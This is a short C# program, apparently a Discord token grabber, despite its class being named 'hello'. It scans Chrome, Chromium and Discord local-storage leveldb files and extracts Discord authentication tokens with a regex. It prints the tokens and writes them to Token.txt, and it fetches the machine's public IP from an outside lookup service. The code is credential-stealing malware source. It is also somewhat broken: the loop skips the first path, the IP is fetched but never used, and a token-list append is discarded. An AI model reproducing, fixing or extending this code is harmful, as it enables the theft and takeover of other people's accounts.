using System.Text.RegularExpressions;
using System.Net;
internal static class hello
{
    public static T[] Append<T>(this T[] array, T item)
    {
        List<T> list = new List<T>(array);
        list.Add(item);
        return list.ToArray();
    }
    internal static void Main()
    {
        int[] found = new int[]{};
        string[] foundLdb = new string[]{};
        string[] foundTokens = new string[]{};
        string[] paths = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Local Storage/leveldb", // 0
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Chromium/User Data/Default/Local Storage/leveldb",      // 1
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Discord/Local Storage/leveldb",                              // 2
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/discordptb/Local Storage/leveldb",                           // 3
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/discordcanary/Local Storage/leveldb"                         // 4
        };
        for(int i = 1; i < paths.Count(); i++) 
        {
            if (Directory.Exists(paths[i])) 
            {
                found = found.Append(i);
                if (found.Contains(i)) 
                {
                    Console.WriteLine(i + " was found!");
                    foreach (string file in Directory.GetFiles(paths[i], "*.ldb", SearchOption.TopDirectoryOnly)) 
                    {
                        string rawText = File.ReadAllText(file);
                        if (rawText.Contains("oken"))
                        {
                            Console.WriteLine($"{Path.GetFileName(file)} added");
                            List<string> list2 = new List<string>(foundLdb);
                            list2.Add(rawText);
                            foundLdb = list2.ToArray();
                        }
                    }
                    foreach (string token in foundLdb)
                    {
                        foreach (Match match in Regex.Matches(token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        {
                            Console.WriteLine($"Token={match.ToString()}");
                            foundTokens.Append(match.ToString());          
                            Console.WriteLine($"Token={match.ToString()}");
                            using (StreamWriter sw = new StreamWriter("Token.txt", true))
                            {
                                var http = new WebClient();
                                string ip = http.DownloadString("https://ip.42.pl/raw");
                                sw.WriteLine($"Token={match.ToString()}");
                            }
                        }
                    }
                }
            }
        }
    }
}